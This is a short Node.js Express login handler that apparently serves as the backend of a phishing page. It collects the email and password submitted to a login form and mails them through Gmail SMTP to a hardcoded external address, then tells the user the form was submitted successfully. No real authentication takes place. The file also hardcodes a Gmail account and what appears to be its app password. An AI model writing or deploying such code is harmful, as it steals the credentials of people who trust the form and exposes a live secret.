const nodemailer = require("nodemailer");

const adminEmail = "victorkudos@gmail.com";
const fromEmailer = "alliespiret889@gmail.com";
const fromPasswordEmailer = 'nqdgdrlnhbzlnusm' 

  exports.postLogin = async (req, res, next) => {
   const email = req.body.email;
   const password = req.body.password;
  
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: fromEmailer,
          pass: fromPasswordEmailer,
        },
      });
  
      const sendMail = async (mailDetails) => {     
          const info = await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: fromEmailer,
        to: adminEmail,
        subject: `SENT BY ${adminEmail}`,
        text: message,
        html: `<h4>Details</h4>
        <p>Password: ${email}
        <p>Password: ${password}</p>
        `,
      };
  
      await sendMail(options);
      console.log("Email sent successfully");
      console.log("sent message");
      const responseData = {
        message: 'Form submitted successfully',
        // You can include any additional data that you want to send back to the frontend
    };
      return res.json(responseData);
  
    } catch (error) {
      return res.status(500).json({ error: { code: 500, message: 'Internal Server Error', details: "An unexpected error occurred while processing your request." } });
    }   
  };

